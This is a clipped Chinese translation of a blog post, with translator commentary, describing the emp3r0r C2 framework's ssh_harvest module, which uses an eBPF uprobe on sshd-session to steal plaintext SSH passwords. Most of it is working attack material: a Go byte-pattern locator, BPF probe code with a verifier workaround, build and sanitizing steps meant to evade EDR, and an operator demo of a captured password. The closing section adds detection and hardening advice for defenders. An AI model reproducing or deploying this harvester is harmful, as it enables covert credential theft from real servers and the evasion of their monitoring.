---
title: 【微信】用 eBPF uprobe 收割 SSH 密码
source: https://mp.weixin.qq.com/s/fHH1u0bWC9NVLMntGtQxew
source_host: mp.weixin.qq.com
clip_date: 2026-10-12T08:57:31+08:00
trace_id: 4885de49-7ab1-4169-a161-3103673efbc7
content_hash: e673ad6ff4a8dc5ca6cee45bd588d4bba5891a33bbf708354852c41abdfe9eab
status: synced
tags:
  - 微信
  - Linux安全
  - 恶意样本
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: emp3r0r v4.22.0 的 ssh_harvest 用 eBPF uprobe 在 sshd-session 的 auth_password 处下断点，从寄存器收割 SSH 明文密码，取代 ptrace 以弱化检测信号。
ai_summary_style: key-points
images_status:
  total: 3
  succeeded: 3
  failed_urls: []
notion_page_id: 3f775244-d011-819e-9e85-c5d805fedaf3
ioc:
  cves: []
  cwes: []
  hashes:
    - 41554154554889fd4889f7534889f348
    - bec826257c5a398670b2c894acf48803
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> emp3r0r v4.22.0 的 ssh_harvest 用 eBPF uprobe 在 sshd-session 的 auth_password 处下断点，从寄存器收割 SSH 明文密码，取代 ptrace 以弱化检测信号。
> 
> - **手法：** 沿用旧版字节模式 `4883c4080fb6c021` 与 INT3 + 读 RSI 的思路，但断点由内核按文件偏移托管，不再 PTRACE_ATTACH、不写目标代码段。
> - **定位与探针：** 扫 ELF 可执行 PT_LOAD 段求文件偏移与 vaddr；probe.bpf.c 自包含，用 `zig cc -target bpfel-freestanding` 编译，依赖内核 5.5+ 的 bpf_probe_read_user_str。
> - **绕过 verifier：** 先把各寄存器按常量偏移装进 volatile 数组，仅下标动态，越界检查后再取值，避开「计算式 ctx 访问」被拒。
> - **OPSEC：** `-g` 生成的 .BTF 会嵌入构建路径，sanitize_bpf.py 出厂前剥离且 fail closed；libbpf 依赖按需映射；Starlark 策略层提前拒绝非法寄存器并过滤不可打印字符。
> - **限制与检测：** 需 root 或 CAP_BPF/CAP_PERFMON/CAP_SYS_ADMIN，仅 x86_64；负数 PID 覆盖所有映射该文件的进程；防御侧可审计 bpf()/perf_event_open，且只有密码认证路径会被收割。

**赛博生存指南** *2026年10月12日 08:28*

> 原文：https://jm33.me/ssh-password-harvesting-with-ebpf.html  
> 作者：jm33  
> 发布时间：2026-10-05  
> 翻译模型：GLM-5.3

编者按：jm33 是开源 C2 框架 emp3r0r 的作者，本仓库 2026-07-28 做过《emp3r0r 源码深度解析》。这是他六年前 ptrace 版 SSH 密码收割的续作：同样的字节模式、同样的 INT3 断点、同样的寄存器，只是这次断点挂在 eBPF uprobe 上，由内核替你保管——不再 PTRACE_ATTACH，也不再由攻击方往代码段里写字节。文章不长，工程细节却很密：BPF 对象用 zig cc 免头文件交叉编译、靠「常量偏移全量装载 + 动态下标」绕过 verifier 对计算式 ctx 访问的拒绝、sanitize_bpf.py 在出厂前剥掉.BTF 里的构建路径、Starlark 做策略层、后台会话让捕获比脚本活得久。emp3r0r v4.22.0 已内置该模块。

![操作台上的实时捕获](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/459768439488c6de.png)

## TL;DR

六年前我写过《SSHD Injection and Password Harvesting》https://jm33.me/sshd-injection-and-password-harvesting.html。思路很简单：用 ptrace 附到 sshd 上，扫描它的代码找一段字节模式，把下一条指令覆写成 INT3，等断点命中，从寄存器里读出密码，恢复字节，脱钩。

这是续篇。emp3r0rhttps://github.com/jm33-m0/emp3r0r/releases/tag/v4.22.0 的 `ssh_harvest` 模块用 eBPF uprobe 做同样的事：同样的代码模式、同样的寄存器、同样的 INT3 把戏，但没有 ptrace 的那些副作用。目标进程从头到尾没有被附加、没有被我们打补丁，也不会出现一个 `PTRACE_ATTACH` 让 EDR 大喊大叫。

你可以说这照样能被检测到。你说得对。重点在于：合法的 eBPF 操作比 ptrace 多得多；加载进内核的程序仍然可见，但这是个比「调试器附加」弱的信号。

## 旧方法为什么过时了

ptrace 收割器是一个用一行 GDB 调用注入的 C 库。它：

-   附加到每连接一个的 sshd 进程（现在是 sshd-session）上；
    
-   扫描代码段找到 `auth_password` ；
    
-   在 PAM 调用之后的那个字节上写 0xCC；
    
-   捕获陷阱并读取 RSI/RBP；
    
-   恢复字节，脱钩。
    

能用，但动静大。任何盯着 `PTRACE_ATTACH` 或代码段写入的 EDR 都大概率会标记它。

uprobe 从内核侧针对文件偏移完成同样的拦截。它本来就是为用户态观测设计的，而这正是我们在做的事。底层是同一套把戏：被探测的字节被换成 INT3，原始指令被复制到带外（out-of-line）位置保存；陷阱命中时，内核运行我们的 handler，单步执行原始指令，然后恢复运行。逻辑没变，但断点由内核掌管，而不是我们——同样的拦截效果，不需要 ptrace 那套野路子。

## 工作原理

三个可复用的件：一个内存中的 BPF 加载器、一个模式定位器、还有探针本身。

### libbpf 模块

emp3r0r v4 加上了 Starlark 运行时https://jm33.me/weaponizing-starlark-non-executable-malware-and-scriptable-c2-agents.html和一个 `libbpf` 模块https://github.com/jm33-m0/emp3r0r/tree/v4/core/modules/libbpf。我没有把 cilium/ebpf 静态链接进 agent，而是复用了我在 Windows 侧 COFFLoader 上已经用过的技巧：模块声明一个依赖，agent 只在用到时把它映射进内存，用完再解除映射。config.json 的相关片段：

```json
{
    "module_files_memfs":true,
    "dependencies":["libbpf"],
    "agent_config":{
        "exec":"ssh_harvest.star",
        "files":["ssh_harvest.star","probe.bpf.o"]
    }
}
```

依赖提供加载器；BPF 对象作为伴随文件送进加密 memfs。模块本身只是一层策略。

### 大海捞针：定位字节模式

uprobe 挂在文件偏移上，所以第一件事是把代码模式换算成偏移。 `ebpf_code_offset` 通过 agent 的 I/O 层读取 sshd 镜像，只扫描可执行的 PT_LOAD 段：

```go
funcFindCodePattern(image, pattern []byte) (offset,     vaddr uint64, err error) {
    f, err := elf.NewFile(bytes.NewReader(image))
if err != nil {
return0, 0, fmt.Errorf("parse ELF: %w", err)
    }
defer f.Close()

for _, p := range f.Progs {
if p.Type != elf.PT_LOAD || p.Flags&elf.PF_X == 0 {
continue
        }
        data := make([]byte, p.Filesz)
if _, err := io.ReadFull(p.Open(), data); err != nil {
continue
        }
        idx := bytes.Index(data, pattern)
if idx < 0 {
continue
        }
return p.Off + uint64(idx), p.Vaddr + uint64(idx), nil
    }
return0, 0, ErrPatternNotFound
}
```

默认模式沿用 ptrace 版本那一个： `4883c4080fb6c021` ，即 add rsp, 8; movzx eax, al; …。它标记的位置，是 `auth_password` 刚在 RAX 里拿到 PAM 结果、密码还留在 RSI 里的那一刻。

发行版构建改动了周边指令时，可以用 `--code-pattern` 从 `auth_password` 符号重新推一个新模式：

![用 radare2 定位 auth\_password](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/bb9ee7addb6c0180.png)

生产环境里的 sshd-session 二进制往往被 strip 过。这种情况下可以装 debug 包把符号找回来。

### 探针

probe.bpf.c 刻意写成自包含：不引内核或 libbpf 头文件，所以能用 `zig cc -target bpfel-freestanding` 直接编译。输入是两张 BTF 定义的 map，输出是一种事件类型：

```rust
// cfg: key 0 -> index of the register to read (see libbpf.ArgRegisters)
struct { __uint(type, BPF_MAP_TYPE_HASH); __uint(max_entries, 1);
         __type(key, __u32); __type(value, __u32); } cfg SEC(".maps");

// events: pid -> captured event
struct { __uint(type, BPF_MAP_TYPE_HASH); __uint(max_entries, 1024);
         __type(key, __u32); __type(value, struct event); } events SEC(".maps");

structevent {
  __u32 pid; __u32 uid; __s64 retval;
char comm[16]; char arg[64];
};
```

最有意思的地方在于：程序怎么读取一个运行时才选定的寄存器，同时不让 verifier 拒绝「计算出来的 ctx 访问」。做法是把每个寄存器按各自的常量偏移装进一个 volatile 数组，动态的只有下标：

```rust
volatile __u64 regs[NR_REGS];
regs[0] = ctx->ax; regs[1] = ctx->di; regs[2] = ctx->si; ...
__u32 reg = *idx;
if (reg >= NR_REGS) return0;
__u64 arg_ptr = regs[reg];

structeventev = {};
ev.pid = bpf_get_current_pid_tgid() >> 32;   // tgid, the process, not the thread
ev.retval = regs[0];                         // RAX at the probe point
bpf_get_current_comm(ev.comm, sizeof(ev.comm));
bpf_probe_read_user_str(ev.arg, sizeof(ev.arg), (constvoid *)arg_ptr);
```

`bpf_probe_read_user_str` 是硬性内核要求（5.5+）。

C2 用自带的 zig 编译对象：

```
$ make
zig cc -O2 -g -fdebug-compilation-dir=. -target bpfel-freestanding \
  -fno-stack-protector -fno-builtin -c probe.bpf.c -o probe.bpf.o
python3 sanitize_bpf.py probe.bpf.o
```

`-g` 负责生成 libbpf 需要的.BTF 节，但它也会把构建路径和源码文本嵌进对象。sanitize_bpf.py 在对象出厂前把这些剥掉，且一旦 ELF/BTF 布局不符合预期就直接报错退出（fail closed）。

## ssh_harvest 模块

模块把上面的件拼起来，还补上了老收割器没做好的两件事：生命周期与过滤。

### 比脚本活得久的捕获

最初的版本会阻塞等一个超时，最后统一上报。 `ebpf_uprobe_start` 则是启动一个后台会话后立即返回，凭据想流多久流多久：

```
started = ebpf_uprobe_start(
    image=image, path=path, offset=offset,
    prog="probe", reg=reg, pid=pid,
    timeout_ms=timeout_s * 1000,   # 0 = until --disable
)
```

每个事件都被追加进一个加密 memfs 文件，并实时推给 operator：

```
func(s *uprobeSession) onEvent(ev libbpf.UprobeEvent) {
    line := formatUprobeEvent(ev)
    util.AppendTextToFileAgent(s.outPath, line) // memfs
    s.notify(line)                              // operator stream
}
```

会话放在进程级全局 sync.Map 里，按模块属主做键，所以 `ssh_harvest --disable` 能找到自己启动的那个会话，operator 不用记什么 id。负数 PID 表示附加到所有映射了该二进制的进程——包括还没启动的会话。

`--disable` 停止捕获，打印去重后的凭据，再删除输出文件。

### 用 Starlark 做过滤

ssh_harvest.star 是策略层。它会在创建任何内核状态之前拒绝未知寄存器，在没有给路径时从 /proc/ `<pid>` /exe 解析活着的 sshd，并把一切不可打印的东西丢掉：

```python
def _is_printable(value):
    if not value:
        return False
    for i in range(len(value)):
        c = ord(value[i])
        if c < 0x20 or c > 0x7E:
            return False
    return True
```

最终报告带上从 RAX 读到的 PAM 结果：

```python
valid = "yes" if ev["retval"] != 0 else"no"
print(sprintf("[+] pid=%d uid=%d comm=%q valid=%s password=%q", ev["pid"], ev["uid"], ev["comm"], valid, ev["arg"]))
```

## 实战演示

在目标机上，用从测试构建推出来的模式启动模块：

```swift
[baf83634 - localhost.localdomain\root] ssh_harvest --code-pattern '41554154554889fd4889f7534889f348' --path '/home/r/emp3r0r/core/modules/ssh_harvest/test/.build/install/libexec/sshd-session'
[*] probing /home/r/emp3r0r/core/modules/ssh_harvest/test/.build/install/libexec/sshd-session at file offset 0x104c0 (vaddr 0x104c0), register RSI, pid -1
[*] capture bec826257c5a398670b2c894acf48803 active until stopped; credentials stream live and accumulate in memfs:///bec826257c5a398670b2c894acf48803.log
[*] run `ssh_harvest --disable` to stop it and collect the credentials
OK
```

然后一次正常登录：

```
$ ssh test@localhost
test@localhost's password:
```

密码在敲下的那一刻就出现在 operator 控制台：

```
[baf83634 - localhost.localdomain\root] !custom_module:
pid=34200 uid=0 retval=0 comm="sshd-session"arg="123456"
```

脚本早就返回了。INT3 还在，但掌管它的是内核：没有 ptrace、没有调试器停顿、没有暂停。

## 要求与限制

-   需要 root，或 CAP_BPF/CAP_PERFMON/CAP_SYS_ADMIN。脚本用 has_cap() 做检查并提前拒绝；procinfo 可确认 agent 持有这些能力。
    
-   内核 5.5+，为了 `bpf_probe_read_user_str` 。
    
-   仅限 x86_64——寄存器映射和 struct pt_regs 布局都是架构相关的。
    
-   OpenSSH 9.8+ 上每连接的监视进程是 sshd-session 而不是 /usr/sbin/sshd；--path 要指向它。
    

![agent 持有的 capabilities](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/1f1754a27fe9727b.png)

## 参考资源

SSHD Injection and Password Harvesting（六年前的前作）：https://jm33.me/sshd-injection-and-password-harvesting.html

emp3r0r v4.22.0 Release：https://github.com/jm33-m0/emp3r0r/releases/tag/v4.22.0

emp3r0r libbpf module（模块源码）：https://github.com/jm33-m0/emp3r0r/tree/v4/core/modules/libbpf

Weaponizing Starlark: Non-Executable Malware and Scriptable C2 Agents：https://jm33.me/weaponizing-starlark-non-executable-malware-and-scriptable-c2-agents.html

## 译者解读

这篇短文看的是 emp3r0r v4 里单个模块的打磨水准，也顺手给出了「ptrace 老手艺怎么平移到 eBPF」的完整范本。几点延伸：

### 断点还是那个断点，换的是语义归属

ptrace 版的问题不在断点本身，而在「谁在管断点」： `PTRACE_ATTACH` 是调试器信号，往代码段写字节是补丁信号，两者都是 EDR 的高优先级事件。uprobe 是内核为 perf / bpftrace 这类正规观测工具准备的机制，同一套「INT3 + 带外单步」由内核代管——从内核视角看，这和一个运维在用 bpftrace 排查 sshd 认证问题没有本质区别。作者说「加载 BPF 程序仍是可见信号，但比调试器附加弱」，这话放到云原生环境还要再加一层：生产节点上 Cilium / Falco / Pixie 本来就常驻大量 eBPF 程序，「有 BPF 在加载」在很多环境里是基线噪音，掩蔽效应比独立主机更强。

补一个原文没展开的机制细节：uprobe 注册在 inode 而不是进程上——断点挂在文件的特定偏移，进该文件的 uprobe consumer 链表，之后任何映射这个文件的进程执行到该偏移都会触发。所以「负数 PID 附加所有映射该二进制的进程、包括尚未启动的会话」不是作者额外做的封装，而是 uprobe 的天然语义。这也正是它比 ptrace（必须逐个进程附加）优雅的地方：收割器装好后，新起的 sshd 会话自动落网。

### verifier 绕法是全文最值钱的部分

eBPF verifier 要求内存访问可静态证明。「按运行时参数选寄存器」最直觉的写法是拿寄存器编号去索引 pt_regs，但那是变址访问 ctx，verifier 不收。作者的写法分两步：先把全部寄存器按各自常量偏移逐一装载进 volatile 数组（每次装载都是常量偏移，verifier 逐条可验证；volatile 防止编译器把这些装载优化掉），动态的只剩数组下标，而「下标过界检查后再访问」是 verifier 认可的标准模式。这个套路在 eBPF 开发里是通用解法，值得单独记下。

### OPSEC 链条上较真的几处

-   `-g` 生成.BTF 的同时会把构建路径和源码文本嵌进对象，sanitize_bpf.py 出厂前剥掉。这和 Windows 侧 PDB 路径泄露是同族问题——本仓库《让你的 Rust 植入体更 OPSEC》里 `--remap-path-prefix` 解决的是同一件事，只是这边选择在产物上事后清洗，并且 fail closed：ELF/BTF 布局不对就拒绝出活。
    
-   COFFLoader 式按需映射：libbpf 依赖只在用到时进内存、用完解除映射，Windows 的内存加载思路平移到了 Linux 侧。
    
-   Starlark 策略层在创建任何内核状态之前就拒绝非法输入——失败提前，不留半装配的内核痕迹。
    

### 检测面：不是零信号

给防御侧几条可落地的：

-   权限门是最早的卡点。加载 BPF 程序需要 CAP_BPF + CAP_PERFMON（老内核是 CAP_SYS_ADMIN），root 级 implant 拿到这些不稀奇，但一台跑普通业务的机器上出现非预期的 BPF capability 组合本身就值得告警。容器场景更要注意：往 securityContext 里随手加 SYS_ADMIN / PERFMON 的做法不少见，等于把这道门提前敞开。
    
-   主流发行版普遍默认关闭非特权 BPF（kernel.unprivileged_bpf_disabled），真正该盯的是「有特权的进程在调 bpf() / perf_event_open」。auditd 对这两个 syscall 落规则是成本最低的覆盖。
    
-   uprobe 注册有两条路：经 tracefs 的会写 /sys/kernel/tracing/uprobe_events，经 perf_event_open 的不落这个文件。只盯文件会漏掉后一条。
    
-   源头防御最省事：如果这台机器只允许公钥登录（PasswordAuthentication no）或上了 MFA，这个模块能收到的东西寥寥。另外注意它只覆盖 password 认证路径——公钥、GSSAPI、keyboard-interactive 都不走 `auth_password` ，收割不到。监控规则若只盯 /usr/sbin/sshd，在 OpenSSH 9.8+ 环境同样会漏——每连接进程已经是 sshd-session 了。
    

工具技巧 · 目录
